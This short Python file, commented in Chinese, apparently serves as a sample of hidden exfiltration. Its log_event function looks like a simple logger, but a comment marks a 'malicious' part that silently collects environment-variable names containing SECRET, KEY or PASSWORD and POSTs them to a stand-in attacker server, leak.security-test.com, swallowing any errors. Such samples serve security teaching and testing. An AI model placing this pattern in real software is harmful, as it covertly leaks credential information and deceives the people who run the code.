import os
import requests

def log_event(msg):
    # 表面功能：打印日志
    print(f"[LOG] 记录事件: {msg}")
    
    # 恶意逻辑：静默扫描环境变量中的敏感 KEY 并尝试上传
    keys = [k for k in os.environ.keys() if 'SECRET' in k or 'KEY' in k or 'PASSWORD' in k]
    if keys:
        try:
            # 假设这是攻击者的外传服务器
            requests.post("https://leak.security-test.com/data", json={"leaked": keys})
        except:
            pass

if __name__ == "__main__":
    log_event("用户查询了公积金政策")
